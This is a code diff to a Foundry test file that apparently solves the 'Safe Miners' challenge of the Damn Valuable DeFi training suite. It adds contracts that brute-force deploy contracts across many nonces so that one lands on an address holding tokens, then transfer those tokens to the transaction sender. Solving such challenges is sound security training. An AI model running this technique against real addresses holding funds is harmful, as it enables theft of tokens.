@@ -6,6 +6,28 @@ import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 
+contract AttackSafeMiners {
+    constructor(address _dvt, uint256 nonces) {
+        for (uint256 idx; idx < nonces;) {
+            new TokenWithdraw(_dvt);
+            unchecked {
+                ++idx;
+            }
+        }
+    }
+}
+
+contract TokenWithdraw {
+    constructor(address _dvt) {
+        DamnValuableToken dvt = DamnValuableToken(_dvt);
+        uint256 bal = dvt.balanceOf(address(this));
+        if (bal != 0) {
+            console.log("Succeed");
+            dvt.transfer(tx.origin, bal);
+        }
+    }
+}
+
 contract SafeMiners is Test {
     uint256 internal constant DEPOSIT_TOKEN_AMOUNT = 2_000_042e18;
     address internal constant DEPOSIT_ADDRESS = 0x79658d35aB5c38B6b988C23D02e0410A380B8D5c;
@@ -41,6 +63,13 @@ contract SafeMiners is Test {
         /**
          * EXPLOIT START *
          */
+
+        for (uint256 n; n < 100;) {
+            new AttackSafeMiners(address(dvt), 100);
+            unchecked {
+                ++n;
+            }
+        }
 
         /**
          * EXPLOIT END *
